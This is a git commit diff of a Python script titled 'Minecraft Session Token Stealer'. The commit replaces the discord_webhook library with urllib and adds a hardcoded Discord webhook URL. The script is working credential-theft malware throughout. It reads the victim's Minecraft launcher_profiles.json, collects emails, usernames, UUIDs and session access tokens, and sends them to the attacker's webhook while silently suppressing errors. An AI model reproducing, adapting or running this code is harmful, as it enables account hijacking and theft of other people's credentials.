063e55aead185bf231681f38a6aaa781277a5063
wodx <38795504+WodxTV@users.noreply.github.com>
2020-04-10 21:12:48 +0200

    Removed external modules

--- token-stealer.py
+++ token-stealer.py
@@ -1,41 +1,49 @@
 # Minecraft Session Token Stealer
 # Author: WodX
-# Github: https://github.com/WodXTV
-# Twitter: https://twitter.com/wodxgod
 
-import discord_webhook
 import json
 import os
+from urllib.request import Request, urlopen
 
 # configuration
-WEBHOOK_URL = '<URL HERE>'
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/698248517814190130/IV5pyY3vxBacvX6kP-fdgaIRmNhMWWzgKYscY7r13_0sA_QhVB1dIeZr509P-8-vH7-T"
 
 def uuid_dashed(uuid):
-    return f'{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}'
+    return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
 
-if __name__ == '__main__':
-    auth_db = json.loads(open(os.getenv('APPDATA') + '\\.minecraft\\launcher_profiles.json').read())['authenticationDatabase']
+def main():
+    auth_db = json.loads(open(os.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())["authenticationDatabase"]
 
-    webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL, username='Minecraft Token Stealer', avatar_url='http://www.rw-designer.com/icon-image/5547-256x256x32.png')
+    embeds = []
+
+    for x in auth_db:
+        try:
+            email = auth_db[x].get("username")
+            uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
+            embed = {
+                "fields": [
+                    {"name": "Email", "value": email if email and "@" in email else "N/A", "inline": False},
+                    {"name": "Username", "value": display_name_object["displayName"].replace("_", "\\_"), "inline": True},
+                    {"name": "UUID", "value": uuid_dashed(uuid), "inline": True},
+                    {"name": "Token", "value": auth_db[x]["accessToken"], "inline": True}
+                ]
+            }
+            embeds.append(embed)
+        except:
+            pass
+
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+    }
+
+    payload = json.dumps({"embeds": embeds})
     
-    for i, x in enumerate(auth_db):
-        token = auth_db[x]['accessToken']
-        email = auth_db[x].get('username')
-        uuid, display_name_object = list(auth_db[x]['profiles'].items())[0]
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
 
-        embed = discord_webhook.DiscordEmbed(color=0xFEFEFE)
-        
-        if i == 0:
-            embed.set_author(name='Download on GitHub', url='https://github.com/WodxTV/Minecraft-Session-Token-Stealer', icon_url='https://github.com/fluidicon.png')
-        elif i == len(auth_db) - 1:
-            embed.set_footer(text='Developed by WodX')
-
-        embed.add_embed_field(name='Email', value=email if email and '@' in email else 'N/A', inline=False)
-
-        embed.add_embed_field(name='Username', value=display_name_object['displayName'])
-        embed.add_embed_field(name='UUID', value=uuid_dashed(uuid))
-        embed.add_embed_field(name='Token', value=token)
-
-        webhook.add_embed(embed)
-
-    webhook.execute()
+if __name__ == "__main__":
+    main()
